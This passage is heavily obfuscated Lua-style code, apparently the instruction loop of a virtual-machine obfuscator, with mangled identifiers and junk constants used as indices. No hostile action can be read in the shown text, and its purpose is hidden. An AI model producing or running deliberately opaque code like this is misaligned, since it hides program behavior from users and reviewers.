IlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zB")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zyY")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("YfB2")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("WE")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DMT")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Uu")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Fns")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("nxhb")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cl")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("arz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("xBPq")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("8c")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("7Va")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oo")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("Y26")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5p")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("p80v")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Mp")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("6yb")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0x")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("agy")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("KK")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("SP")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{{161;681;109;378};{514;511;128;706};"1 + 1 = 111";}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eN")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("KZA")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7E3M")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("9Su")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4k")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("skO")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("6eRQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("WD")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("CUt")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sL")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("F4F")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BC")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lj6")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("yKMh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nB")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3u9")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("IO5O")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("RX")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("I93")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("OBjQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("S5")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{944;342;412;221};"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Q0eu")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Bj")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0uZ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("0pef")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("au")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("cO0")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("D3")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("D2N")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{76;591;320;446};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Z8G")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jPCF")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Rb")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qg7")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("XZID")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{65;215;594;15};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("2G3")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{272;900;645;180};"1 + 1 = 111";{274;533;478;816};}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gH")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("TFZ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("GtmQ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zj")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qL2")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("g9vE")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("AF")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("pQy")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("iGGb")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ny")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("epe")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("b7uT")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("30")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("sgB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("TD")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{350;576;601;361};"1 + 1 = 111";{5;197;66;324};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("89On")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{50;586;634;743};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("EUW")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LZ")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZdV")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("JX")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BkG")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("0sLp")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hG")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("YIJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Yd88")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ec")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("97B")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("1tbD")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zM")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Lve")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("jt8Z")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xb")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{410;462;953;82};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("rtG0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("e27")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sp")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("GpY")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("JV")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Zv0")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{270;90;807;820};"1 + 1 = 111";{976;240;621;773};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("v8")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("4dT")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eF")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("UIU")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("IKb")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("d0")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("208")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xr")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("QVF")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("HP9H")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Yj")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("59p")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3E")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mfb")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Yyf3")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ex")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Tbc")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("aI")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("hoo")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ts")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Mkq")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("eHIB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("l9")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Pyn")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("R614")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{418;901;777;322};{447;359;474;995};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0nI")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("PbZ4")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("29")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rR1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("HWVm")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3V")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{168;205;609;157};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gLaZ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Rs")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("YlQ")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Oo")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("Gla")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0E")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("HyM")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 